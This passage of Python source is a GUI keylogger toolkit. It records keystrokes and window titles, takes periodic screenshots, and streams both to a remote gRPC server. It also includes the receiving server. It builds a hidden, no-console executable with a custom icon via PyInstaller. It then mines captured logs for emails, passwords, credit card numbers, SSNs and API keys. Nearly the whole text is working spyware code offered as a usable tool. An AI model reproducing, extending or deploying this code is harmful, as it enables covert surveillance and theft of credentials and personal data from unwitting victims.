            output_inner,
            text="Output",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,10))

        self.txt_genexe_output = tk.Text(output_inner, height=8, font=("Consolas", 10),
                                         bg=COLORS['bg_light'], fg=COLORS['text_primary'],
                                         insertbackground=COLORS['text_primary'])
        self.txt_genexe_output.pack(fill=BOTH, expand=YES)

        # Pack canvas and scrollbar
        canvas.pack(side=LEFT, fill=BOTH, expand=YES)
        scrollbar.pack(side=RIGHT, fill="y")

    def _build_classify_tab(self):
        """Build the log classification tab."""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  🔍 CLASSIFY  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)

        # Input
        input_card = ttk.Frame(container, style='Card.TFrame')
        input_card.pack(fill=X, pady=(0,20))
        
        input_inner = ttk.Frame(input_card)
        input_inner.configure(style='Card.TFrame')
        input_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            input_inner,
            text="Input File",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        row1 = ttk.Frame(input_inner)
        row1.configure(style='Card.TFrame')
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Log File:", width=12,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_classify_file, width=40).pack(side=LEFT, padx=5)
        ttk.Button(row1, text="Browse", command=self._browse_classify_file, bootstyle="info-outline").pack(side=LEFT)

        row2 = ttk.Frame(input_inner)
        row2.configure(style='Card.TFrame')

        row2.pack(fill=X, pady=10)
        ttk.Button(row2, text="🔍 Classify Emails & Passwords", command=self._classify_log,
                   bootstyle="primary", width=30).pack()

        # Results
        results_card = ttk.Frame(container, style='Card.TFrame')
        results_card.pack(fill=BOTH, expand=YES)
        
        results_inner = ttk.Frame(results_card)
        results_inner.configure(style='Card.TFrame')
        results_inner.pack(fill=BOTH, expand=YES, padx=20, pady=15)
        
        ttk.Label(
            results_inner,
            text="Results",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,10))

        self.txt_classify_output = tk.Text(results_inner, height=20, font=("Consolas", 10),
                                           bg=COLORS['bg_light'], fg=COLORS['text_primary'],
                                           insertbackground=COLORS['text_primary'])
        self.txt_classify_output.pack(fill=BOTH, expand=YES)

    def _build_viewer_tab(self):
        """Build the log viewer tab."""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  📄 LOG VIEWER  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)

        # Controls
        ctrl_frame = ttk.Frame(container)
        ctrl_frame.configure(style='Dark.TFrame')
        ctrl_frame.pack(fill=X, pady=(0,15))
        ttk.Button(ctrl_frame, text="🔄 Refresh", command=self._refresh_log, bootstyle="info").pack(side=LEFT, padx=5)
        ttk.Button(ctrl_frame, text="🗑️ Clear Log File", command=self._clear_log, bootstyle="danger").pack(side=LEFT, padx=5)

        # Text area with scrollbar
        viewer_card = ttk.Frame(container, style='Card.TFrame')
        viewer_card.pack(fill=BOTH, expand=YES)
        
        viewer_inner = ttk.Frame(viewer_card)
        viewer_inner.configure(style='Card.TFrame')
        viewer_inner.pack(fill=BOTH, expand=YES, padx=20, pady=15)
        
        viewer_frame = ttk.Frame(viewer_inner)
        viewer_frame.configure(style='Card.TFrame')
        viewer_frame.pack(fill=BOTH, expand=YES)
        
        scrollbar = ttk.Scrollbar(viewer_frame)
        scrollbar.pack(side=RIGHT, fill='y')
        
        self.txt_log_viewer = tk.Text(viewer_frame, font=("Consolas", 10), yscrollcommand=scrollbar.set,
                                      bg=COLORS['bg_light'], fg=COLORS['text_primary'],
                                      insertbackground=COLORS['text_primary'])
        self.txt_log_viewer.pack(fill=BOTH, expand=YES)
        scrollbar.config(command=self.txt_log_viewer.yview)

    def _build_grpc_tab(self):
        """Build the gRPC server tab."""
        tab = ttk.Frame(self.notebook)
        tab.configure(style='Dark.TFrame')
        self.notebook.add(tab, text="  📡 GRPC SERVER  ")
        
        container = ttk.Frame(tab)
        container.configure(style='Dark.TFrame')
        container.pack(fill=BOTH, expand=YES, padx=40, pady=40)

        # Server settings
        server_card = ttk.Frame(container, style='Card.TFrame')
        server_card.pack(fill=X, pady=(0,20))
        
        server_inner = ttk.Frame(server_card)
        server_inner.configure(style='Card.TFrame')
        server_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            server_inner,
            text="Server Settings",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,15))

        row1 = ttk.Frame(server_inner)
        row1.configure(style='Card.TFrame')
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Port:", width=12,
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(side=LEFT)
        ttk.Spinbox(row1, from_=1024, to=65535, textvariable=self.var_grpc_port, width=10).pack(side=LEFT, padx=5)

        row2 = ttk.Frame(server_inner)
        row2.configure(style='Card.TFrame')
        row2.pack(fill=X, pady=10)
        self.btn_grpc_server = ttk.Button(row2, text="▶ Start gRPC Server",
                                           command=self._toggle_grpc_server, bootstyle="success", width=25)
        self.btn_grpc_server.pack()

        # Log output
        log_card = ttk.Frame(container, style='Card.TFrame')
        log_card.pack(fill=BOTH, expand=YES, pady=(0,20))
        
        log_inner = ttk.Frame(log_card)
        log_inner.configure(style='Card.TFrame')
        log_inner.pack(fill=BOTH, expand=YES, padx=20, pady=15)
        
        ttk.Label(
            log_inner,
            text="Received Logs",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,10))

        log_frame = ttk.Frame(log_inner)
        log_frame.configure(style='Card.TFrame')
        log_frame.pack(fill=BOTH, expand=YES)
        
        scrollbar = ttk.Scrollbar(log_frame)
        scrollbar.pack(side=RIGHT, fill='y')
        
        self.txt_grpc_log = tk.Text(log_frame, height=15, font=("Consolas", 10), yscrollcommand=scrollbar.set,
                                    bg=COLORS['bg_light'], fg=COLORS['text_primary'],
                                    insertbackground=COLORS['text_primary'])
        self.txt_grpc_log.pack(fill=BOTH, expand=YES)
        scrollbar.config(command=self.txt_grpc_log.yview)

        # Info
        info_card = ttk.Frame(container, style='Card.TFrame')
        info_card.pack(fill=X)
        
        info_inner = ttk.Frame(info_card)
        info_inner.configure(style='Card.TFrame')
        info_inner.pack(fill=BOTH, expand=YES, padx=30, pady=20)
        
        ttk.Label(
            info_inner,
            text="ℹ️ Info",
            font=('Segoe UI', 14, 'bold'),
            foreground=COLORS['text_primary'],
            background=COLORS['bg_medium']
        ).pack(anchor=W, pady=(0,10))
        
        ttk.Label(info_inner, text="⚠️ Requires grpcio and generated proto files",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(anchor=W, pady=2)
        ttk.Label(info_inner, text="Run: pip install grpcio grpcio-tools",
                 background=COLORS['bg_medium'],
                 foreground=COLORS['text_secondary']).pack(anchor=W, pady=2)

    # ==================== Action Methods (SAME AS ORIGINAL) ====================

    def _browse_output(self):
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filepath:
            self.var_output_file.set(filepath)

    def _browse_screenshot_folder(self):
        folder = filedialog.askdirectory()
        if folder:
            self.var_screenshot_folder.set(folder)

    def _browse_icon(self):
        filepath = filedialog.askopenfilename(
            filetypes=[("Icon files", "*.ico *.icns"), ("All files", "*.*")]
        )
        if filepath:
            self.var_exe_icon.set(filepath)

    def _browse_classify_file(self):
        filepath = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("Log files", "*.log"), ("All files", "*.*")]
        )
        if filepath:
            self.var_classify_file.set(filepath)

    def _toggle_keylogger(self):
        if not HAS_PYNPUT:
            self._show_error("pynput not installed", "Please install pynput: pip install pynput")
            return

        if self.keylogger_running:
            self._stop_keylogger()
        else:
            self._start_keylogger()

    def _start_keylogger(self):
        self.keylogger_running = True
        self.var_status.set("Active")
        self.btn_start.config(text="⏹ Stop Keylogger", bootstyle="danger")
        if hasattr(self, 'btn_dash_toggle'):
            self.btn_dash_toggle.config(text="⏹ Stop Keylogger", bootstyle="danger")

        # Reset stats
        self.key_count = 0
        self.window_changes = 0
        self.start_time = datetime.now()
        self.var_key_count.set("0")
        self.var_window_count.set("0")
        
        # Initialize gRPC client if server is configured
        grpc_server = self.var_grpc_server.get().strip()
        if grpc_server:
            try:
                import grpc
                import protos.server_pb2 as keylog_pb2
                import protos.server_pb2_grpc as keylog_pb2_grpc
                
                self.grpc_channel = grpc.insecure_channel(grpc_server)
                self.grpc_stub = keylog_pb2_grpc.KeylogServiceStub(self.grpc_channel)
                print(f"[+] gRPC client connected to {grpc_server}")
            except Exception as e:
                print(f"[-] gRPC client error: {e}")
                self.grpc_stub = None

        def on_press(key):
            if not self.keylogger_running:
                return False
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            current_window = get_active_window_title() if self.var_window_title.get() else ""

            try:
                with open(self.var_output_file.get(), 'a', encoding='utf-8') as f:
                    if self.var_window_title.get() and current_window != self.last_window_title:
                        f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                        self.last_window_title = current_window
                        self.window_changes += 1
                        self.var_window_count.set(str(self.window_changes))

                    if hasattr(key, 'char') and key.char:
                        if self.var_timestamp.get():
                            f.write(f'[{timestamp}] Key: {key.char}\n')
                        else:
                            f.write(key.char)
                    else:
                        key_name = str(key).replace('Key.', '')
                        if key_name == 'space':
                            f.write(' ')
                        elif key_name == 'enter':
                            f.write('\n')
                        elif self.var_timestamp.get():
                            f.write(f'[{timestamp}] [{key_name}]\n')
                        else:
                            f.write(f'[{key_name}]')
                    
                    self.key_count += 1
                    self.var_key_count.set(str(self.key_count))
                
                # Send to gRPC server
                if self.grpc_stub:
                    try:
                        import protos.server_pb2 as keylog_pb2
                        
                        # Format message
                        if hasattr(key, 'char') and key.char:
                            message = f"[{timestamp}] Key: {key.char}"
                        else:
                            key_name = str(key).replace('Key.', '')
                            message = f"[{timestamp}] [{key_name}]"
                        
                        if current_window:
                            message = f"Window: {current_window} | {message}"
                        
                        # Send non-blocking
                        self.grpc_stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=message))
                    except Exception as e:
                        print(f"gRPC send error: {e}")
                        
            except Exception as e:
                print(f"Error: {e}")

        def on_release(key):
            if key == keyboard.Key.esc:
                self.app.after(0, self._stop_keylogger)
                return False
            return self.keylogger_running

        self.keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        self.keylogger_listener.start()
        
        # Start timer
        self._start_stats_update()

    def _stop_keylogger(self):
        self.keylogger_running = False
        self.var_status.set("Inactive")
        self.btn_start.config(text="▶ Start Keylogger", bootstyle="success")
        if hasattr(self, 'btn_dash_toggle'):
            self.btn_dash_toggle.config(text="▶ Start Keylogger", bootstyle="success")
        
        if self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_listener = None
        
        # Close gRPC channel
        if self.grpc_channel:
            try:
                self.grpc_channel.close()
                print("[+] gRPC client disconnected")
            except:
                pass
            self.grpc_channel = None
            self.grpc_stub = None
        
        self._stop_stats_update()

    def _start_stats_update(self):
        def update_duration():
            if self.keylogger_running and self.start_time:
                elapsed = datetime.now() - self.start_time
                hours, remainder = divmod(elapsed.seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                self.var_duration.set(f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            
            if self.keylogger_running:
                self.update_timer = self.app.after(1000, update_duration)
        update_duration()

    def _stop_stats_update(self):
        if self.update_timer:
            self.app.after_cancel(self.update_timer)
            self.update_timer = None

    def _take_screenshot(self):
        folder = self.var_screenshot_folder.get()
        if not os.path.exists(folder):
            os.makedirs(folder)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(folder, f"screenshot_{timestamp}.png")

        try:
            # Take screenshot
            screenshot_data = None
            if HAS_PIL:
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
                # Convert to bytes for gRPC
                import io
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                screenshot_data = buffer.getvalue()
                
            elif HAS_MSS:
                with mss.mss() as sct:
                    sct.shot(output=filepath)
                # Read the saved file to send via gRPC
                with open(filepath, 'rb') as f:
                    screenshot_data = f.read()
            else:
                self._show_error("Error", "No screenshot library available. Install PIL or mss.")
                return
            
            # Update counter
            count = int(self.var_screenshot_count.get())
            self.var_screenshot_count.set(str(count + 1))
            
            # Send to gRPC server if connected
            if self.grpc_stub and screenshot_data:
                try:
                    import protos.server_pb2 as keylog_pb2
                    filename = f"screenshot_{timestamp}.png"
                    
                    # Send screenshot non-blocking
                    future = self.grpc_stub.SendScreenshot.future(
                        keylog_pb2.ScreenshotRequest(
                            filename=filename,
                            image_data=screenshot_data
                        )
                    )
                    print(f"📸 Screenshot sent to server: {filename}")
                except Exception as e:
                    print(f"Failed to send screenshot to gRPC: {e}")
            
            self._show_info("Success", f"Screenshot saved: {filepath}")
            
        except Exception as e:
            self._show_error("Error", f"Failed to take screenshot: {str(e)}")

    def _toggle_auto_screenshot(self):
        if self.screenshot_running:
            self._stop_auto_screenshot()
        else:
            self._start_auto_screenshot()

    def _start_auto_screenshot(self):
        if not HAS_PIL and not HAS_MSS:
            self._show_error("Error", "No screenshot library available.")
            return

        self.screenshot_running = True
        self.btn_auto_screenshot.config(text="⏹ Stop Auto Screenshot", bootstyle="danger")

        def screenshot_loop():
            last_window = None
            while self.screenshot_running:
                try:
                    folder = self.var_screenshot_folder.get()
                    if not os.path.exists(folder):
                        os.makedirs(folder)

                    should_capture = False
                    
                    if self.var_screenshot_on_change.get():
                        current_window = get_active_window_title()
                        if current_window != last_window:
                            should_capture = True
                            last_window = current_window
                    else:
                        should_capture = True

                    if should_capture:
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filepath = os.path.join(folder, f"auto_{timestamp}.png")
                        screenshot_data = None

                        if HAS_PIL:
                            screenshot = ImageGrab.grab()
                            screenshot.save(filepath)
                            # Convert to bytes
                            import io
                            buffer = io.BytesIO()
                            screenshot.save(buffer, format='PNG')
                            screenshot_data = buffer.getvalue()
                            
                        elif HAS_MSS:
                            with mss.mss() as sct:
                                sct.shot(output=filepath)
                            with open(filepath, 'rb') as f:
                                screenshot_data = f.read()
                        
                        count = int(self.var_screenshot_count.get())
                        self.var_screenshot_count.set(str(count + 1))
                        
                        # Send to gRPC if connected
                        if self.grpc_stub and screenshot_data:
                            try:
                                import protos.server_pb2 as keylog_pb2
                                filename = f"auto_{timestamp}.png"
                                self.grpc_stub.SendScreenshot.future(
                                    keylog_pb2.ScreenshotRequest(
                                        filename=filename,
                                        image_data=screenshot_data
                                    )
                                )
                                print(f"📸 Auto screenshot sent: {filename}")
                            except:
                                pass

                    if not self.var_screenshot_on_change.get():
                        time.sleep(self.var_screenshot_interval.get())
                    else:
                        time.sleep(1)

                except Exception as e:
                    print(f"Screenshot error: {e}")
                    break

        self.screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
        self.screenshot_thread.start()

    def _stop_auto_screenshot(self):
        self.screenshot_running = False
        self.btn_auto_screenshot.config(text="▶ Start Auto Screenshot", bootstyle="success")

    def _generate_executable(self):
        self.txt_genexe_output.delete(1.0, END)
        self.txt_genexe_output.insert(END, "[*] Generating executable...\n\n")
        threading.Thread(target=self._generate_exe_thread, daemon=True).start()

    def _generate_exe_thread(self):
        try:
            try:
                import PyInstaller
            except ImportError:
                self.app.after(0, lambda: self.txt_genexe_output.insert(END, 
                    "[-] PyInstaller not found. Install: pip install pyinstaller\n"))
                return

            self.app.after(0, lambda: self.txt_genexe_output.insert(END, "[+] Creating keylogger script...\n"))
            
            script_content = self._create_standalone_script()
            
            temp_dir = tempfile.mkdtemp()
            script_path = os.path.join(temp_dir, "keylogger.py")
            
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(script_content)

            exe_name = self.var_exe_name.get()
            if self.var_exe_os.get() == 'win' and not exe_name.endswith('.exe'):
                exe_name += '.exe'

            cmd = ['pyinstaller']
            
            if self.var_exe_onefile.get():
                cmd.append('--onefile')
            
            if self.var_exe_noconsole.get():
                if platform.system() == 'Windows':
                    cmd.append('--noconsole')
                else:
                    cmd.append('--windowed')
            
            icon_path = self.var_exe_icon.get()
            if icon_path and os.path.exists(icon_path):
                cmd.extend(['--icon', icon_path])
            
            cmd.extend(['--name', exe_name])
            cmd.append(script_path)

            self.app.after(0, lambda: self.txt_genexe_output.insert(END, 
                f"[+] Command: {' '.join(cmd)}\n\n"))

            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=temp_dir
            )

            for line in process.stdout:
                self.app.after(0, lambda l=line: self.txt_genexe_output.insert(END, l))
                self.app.after(0, lambda: self.txt_genexe_output.see(END))

            process.wait()

            if process.returncode == 0:
                dist_dir = os.path.join(temp_dir, 'dist')
                exe_path = os.path.join(dist_dir, exe_name)
                
                if os.path.exists(exe_path):
                    dest_path = os.path.join(os.getcwd(), exe_name)
                    shutil.copy(exe_path, dest_path)
                    
                    self.app.after(0, lambda: self.txt_genexe_output.insert(END, 
                        f"\n[+] SUCCESS! Executable: {dest_path}\n"))
                    self.app.after(0, lambda: self._show_info("Success", 
                        f"Executable created:\n{dest_path}"))
            else:
                self.app.after(0, lambda: self.txt_genexe_output.insert(END, 
                    "\n[-] PyInstaller failed\n"))

            shutil.rmtree(temp_dir, ignore_errors=True)

        except Exception as e:
            self.app.after(0, lambda: self.txt_genexe_output.insert(END, f"\n[-] Error: {e}\n"))

    def _create_standalone_script(self):
        use_timestamp = self.var_exe_timestamp.get()
        use_window = self.var_exe_window.get()
        use_screenshot = self.var_exe_screenshot.get()
        screenshot_interval = self.var_exe_screenshot_interval.get()

        script = '''#!/usr/bin/env python3
import os
import time
from datetime import datetime
from pynput import keyboard

LOG_FILE = "keylog.txt"
'''

        if use_screenshot:
            script += f'''
try:
    from PIL import ImageGrab
    HAS_PIL = True
except:
    HAS_PIL = False

SCREENSHOT_FOLDER = "screenshots"
SCREENSHOT_INTERVAL = {screenshot_interval}
'''

        if use_window:
            script += '''
import platform

def get_window_title():
    if platform.system() == "Windows":
        try:
            import ctypes
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value if buf.value else "Desktop"
        except:
            return "Desktop"
    return "Desktop"

last_window = ""
'''

        script += '''
def on_press(key):
'''
        if use_window:
            script += '''    global last_window
    current = get_window_title()
    if current != last_window:
'''
            if use_timestamp:
                script += '''        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\\n--- [{current}] at {datetime.now()} ---\\n")
'''
            else:
                script += '''        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\\n--- [{current}] ---\\n")
'''
            script += '''        last_window = current
'''

        script += '''    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
'''
        if use_timestamp:
            script += '''            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
'''
        
        script += '''            if hasattr(key, 'char') and key.char:
'''
        if use_timestamp:
            script += '''                f.write(f"[{timestamp}] {key.char}\\n")
'''
        else:
            script += '''                f.write(key.char)
'''
        
        script += '''            else:
                k = str(key).replace('Key.', '')
                if k == 'space':
                    f.write(' ')
                elif k == 'enter':
                    f.write('\\n')
                else:
                    f.write(f'[{k}]')
    except:
        pass

listener = keyboard.Listener(on_press=on_press)
listener.start()
'''

        if use_screenshot:
            script += '''
import threading

def screenshot_loop():
    while True:
        try:
            if not os.path.exists(SCREENSHOT_FOLDER):
                os.makedirs(SCREENSHOT_FOLDER)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(SCREENSHOT_FOLDER, f"ss_{timestamp}.png")
            
            if HAS_PIL:
                img = ImageGrab.grab()
                img.save(filepath)
        except:
            pass
        time.sleep(SCREENSHOT_INTERVAL)

threading.Thread(target=screenshot_loop, daemon=True).start()
'''

        script += '''
listener.join()
'''
        return script

    def _classify_log(self):
        """Classify emails and passwords using the enhanced classifier"""
        filepath = self.var_classify_file.get()
        if not os.path.exists(filepath):
            self._show_error("File Not Found", f"File not found: {filepath}")
            return

        self.txt_classify_output.delete(1.0, END)
        self.txt_classify_output.insert(END, f"[*] Analyzing: {filepath}\n\n")

        try:
            # Import the new enhanced classifier
            from classifier import EnhancedClassifier, FileObserver

            # Read the file
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()

            # Determine output path for JSON
            output_path = filepath + '.classified.json'

            # Create classifier (use_llm=True for AI, False for fast mode)
            classifier = EnhancedClassifier(use_llm=True)

            # Attach FileObserver to capture alerts for JSON
            file_observer = FileObserver(output_path)
            classifier.attach(file_observer)

            # Run the analysis
            result = classifier.classify_text(text)

            # Add observer alert data to result if exists
            if file_observer.get_alert_data():
                result['alert'] = file_observer.get_alert_data()

            # Display emails
            self.txt_classify_output.insert(END, "=" * 50 + "\n")
            self.txt_classify_output.insert(END, f"📧 EMAILS FOUND: {len(result['emails'])}\n")
            self.txt_classify_output.insert(END, "=" * 50 + "\n")
            for item in result['emails'][:20]:  # Show top 20
                self.txt_classify_output.insert(END, f" [{item['count']}x] {item['value']}\n")

            # Display passwords
            self.txt_classify_output.insert(END, "\n" + "=" * 50 + "\n")
            self.txt_classify_output.insert(END, f"🔑 PASSWORD CANDIDATES: {len(result['passwords'])}\n")
            self.txt_classify_output.insert(END, "=" * 50 + "\n")
            for item in result['passwords'][:20]:  # Show top 20
                self.txt_classify_output.insert(END, f" [{item['count']}x] {item['value']}\n")

            # Display additional sensitive data
            sensitive = result['sensitive_data']
            if sensitive['credit_cards'] or sensitive['ssns'] or sensitive['api_keys']:
                self.txt_classify_output.insert(END, "\n" + "=" * 50 + "\n")
                self.txt_classify_output.insert(END, "💳 ADDITIONAL SENSITIVE DATA\n")
                self.txt_classify_output.insert(END, "=" * 50 + "\n")
                if sensitive['credit_cards']:
                    self.txt_classify_output.insert(END, f"Credit Cards: {len(sensitive['credit_cards'])}\n")
                    for cc in sensitive['credit_cards'][:5]:
                        self.txt_classify_output.insert(END, f" - {cc}\n")
                if sensitive['ssns']:
                    self.txt_classify_output.insert(END, f"SSNs: {len(sensitive['ssns'])}\n")
                    for ssn in sensitive['ssns'][:5]:
                        self.txt_classify_output.insert(END, f" - {ssn}\n")
                if sensitive['api_keys']:
                    self.txt_classify_output.insert(END, f"API Keys: {len(sensitive['api_keys'])}\n")
                    for key in sensitive['api_keys'][:5]:
                        self.txt_classify_output.insert(END, f" - {key[:30]}...\n")

            # Display criticality assessment if available (using NEW keys from classifier)
            if result['criticality_assessment']:
                crit = result['criticality_assessment']
                self.txt_classify_output.insert(END, f"\n{'=' * 50}\n")
                self.txt_classify_output.insert(END, "🎯 CRITICALITY ASSESSMENT\n")
                self.txt_classify_output.insert(END, f"{'=' * 50}\n")

                # Final combined score first
                self.txt_classify_output.insert(END,
                                                f"Final Risk Level: {crit['criticality_level']} ({crit['final_risk_score']:.0%})\n")

                # Breakdown using the renamed keys
                self.txt_classify_output.insert(END, "Breakdown:\n")
                self.txt_classify_output.insert(END, f"• Rules-based danger: {crit['rules_danger']:.0%}\n")
                self.txt_classify_output.insert(END, f"• AI suspicion: {crit['ai_suspicion']:.0%}\n")

                # Reasoning
                self.txt_classify_output.insert(END, f"Reason: {crit['ai_reasoning']}\n")

                if crit['is_critical']:
                    self.txt_classify_output.insert(END, "\n⚠️ CRITICAL DATA DETECTED!\n")

            # Display alert info if present
            if 'alert' in result:
                alert = result['alert']
                self.txt_classify_output.insert(END, f"\n{'=' * 50}\n")
                self.txt_classify_output.insert(END, "🚨 ALERT TRIGGERED\n")
                self.txt_classify_output.insert(END, f"{'=' * 50}\n")
                self.txt_classify_output.insert(END, f"Type: {alert['alert_type']}\n")
                self.txt_classify_output.insert(END, f"Time: {alert['alert_timestamp']}\n")

            # Save detailed results to JSON (including alert if present)
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(result, f, indent=2, ensure_ascii=False)

            self.txt_classify_output.insert(END, f"\n{'=' * 50}\n")
            self.txt_classify_output.insert(END, f"[+] Detailed results saved to:\n")
            self.txt_classify_output.insert(END, f" {output_path}\n")
            if 'alert' in result:
                self.txt_classify_output.insert(END, f"[+] Alert data included in JSON file\n")

        except ImportError as e:
            self.txt_classify_output.insert(END, f"\n[-] Import Error: {e}\n")
            self.txt_classify_output.insert(END, "[!] Make sure classifier.py is in the same directory\n")
        except Exception as e:
            self.txt_classify_output.insert(END, f"\n[-] Error: {e}\n")
            import traceback
            self.txt_classify_output.insert(END, f"\n{traceback.format_exc()}\n")

    def _basic_classify(self, filepath):
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()

        EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
        emails = EMAIL_RE.findall(text)

        PASS_RE = re.compile(r"(?i)(?:password|passwd|pass|pwd|pw)\s*[:=]\s*['\"]?([^'\"\s,;]+)")
        passwords = PASS_RE.findall(text)

        self.txt_classify_output.insert(END, "=" * 50 + "\n")
        self.txt_classify_output.insert(END, f"📧 EMAILS: {len(set(emails))}\n")
        self.txt_classify_output.insert(END, "=" * 50 + "\n")
        for email in sorted(set(emails))[:20]:
            self.txt_classify_output.insert(END, f"  - {email}\n")

        self.txt_classify_output.insert(END, "\n" + "=" * 50 + "\n")
        self.txt_classify_output.insert(END, f"🔑 PASSWORDS: {len(set(passwords))}\n")
        self.txt_classify_output.insert(END, "=" * 50 + "\n")
        for pwd in sorted(set(passwords))[:20]:
            self.txt_classify_output.insert(END, f"  - {pwd}\n")

    def _refresh_log(self):
        filepath = self.var_output_file.get()
        self.txt_log_viewer.delete(1.0, END)

        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                self.txt_log_viewer.insert(END, content)
                self.txt_log_viewer.see(END)
            except Exception as e:
                self.txt_log_viewer.insert(END, f"Error: {e}")
        else:
            self.txt_log_viewer.insert(END, f"File not found: {filepath}")

    def _clear_log(self):
        filepath = self.var_output_file.get()
        
        result = Messagebox.yesno("Confirm", f"Clear log file?\n{filepath}")
        
        if result:
            try:
                with open(filepath, 'w') as f:
                    f.write("")
                self._refresh_log()
                self._show_info("Cleared", "Log file cleared")
            except Exception as e:
                self._show_error("Error", str(e))

    def _toggle_grpc_server(self):
        if self.grpc_server_running:
            self.grpc_server_running = False
            self.btn_grpc_server.config(text="▶ Start gRPC Server", bootstyle="success")
            self.txt_grpc_log.insert(END, "[*] Server stopped\n")
        else:
            try:
                import grpc
                from concurrent import futures
                import protos.server_pb2 as keylog_pb2
                import protos.server_pb2_grpc as keylog_pb2_grpc
            except ImportError as e:
                self._show_error("Import Error", f"Missing: {e}\nInstall: pip install grpcio")
                return

            self.grpc_server_running = True
            self.btn_grpc_server.config(text="⏹ Stop gRPC Server", bootstyle="danger")

            port = self.var_grpc_port.get()
            self.txt_grpc_log.insert(END, f"[+] Starting server on port {port}...\n")

            gui = self

            class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
                def __init__(self):
                    # Create screenshots directory
                    self.screenshot_dir = "received_screenshots"
                    if not os.path.exists(self.screenshot_dir):
                        os.makedirs(self.screenshot_dir)
                
                def SendKeylog(self, request, context):
                    gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, f"[RECV] {request.message}\n"))
                    gui.app.after(0, lambda: gui.txt_grpc_log.see(END))
                    return keylog_pb2.KeylogResponse(response=True)
                
                def SendScreenshot(self, request, context):
                    try:
                        # Save screenshot
                        filepath = os.path.join(self.screenshot_dir, request.filename)
                        with open(filepath, 'wb') as f:
                            f.write(request.image_data)
                        
                        # Display in GUI
                        msg = f"[SCREENSHOT] Received and saved: {filepath}\n"
                        gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, msg))
                        gui.app.after(0, lambda: gui.txt_grpc_log.see(END))
                        
                        return keylog_pb2.ScreenshotResponse(
                            success=True,
                            message=f"Screenshot saved: {filepath}"
                        )
                    except Exception as e:
                        error_msg = f"[ERROR] Failed to save screenshot: {e}\n"
                        gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, error_msg))
                        return keylog_pb2.ScreenshotResponse(
                            success=False,
                            message=f"Error: {str(e)}"
                        )

            def run_server():
                server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
                keylog_pb2_grpc.add_KeylogServiceServicer_to_server(KeylogServer(), server)
                server.add_insecure_port(f"[::]:{port}")
                server.start()
                gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, f"[+] Running on [::]:{port}\n"))
                
                while gui.grpc_server_running:
                    time.sleep(1)
                
                server.stop(0)

            threading.Thread(target=run_server, daemon=True).start()

    def _show_error(self, title, message):
        Messagebox.show_error(message, title)

    def _show_info(self, title, message):
        Messagebox.show_info(message, title)

    def run(self):
        """Run the application."""
        self.app.mainloop()


